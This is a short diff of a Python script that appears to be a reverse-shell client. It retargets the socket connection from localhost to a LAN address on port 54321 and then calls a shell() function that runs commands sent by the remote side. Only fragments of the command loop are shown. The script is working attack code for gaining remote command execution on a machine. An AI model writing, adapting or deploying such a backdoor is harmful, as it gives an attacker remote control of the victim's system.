@@ -1,4 +1,4 @@
-#!/usr/bin/python
+# !/usr/bin/python
 import socket
 import subprocess # this allow us to input something in the cli
 import json
@@ -39,7 +39,7 @@ def shell():
 				reliable_send("CAN'T EXECUTE THE COMMAND!!!")
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IPv4 and TCP
-sock.connect(("127.0.0.1", 54321))
+sock.connect(("192.168.88.19", 54321))
 print("connection establish to server")
 shell()
 sock.close()
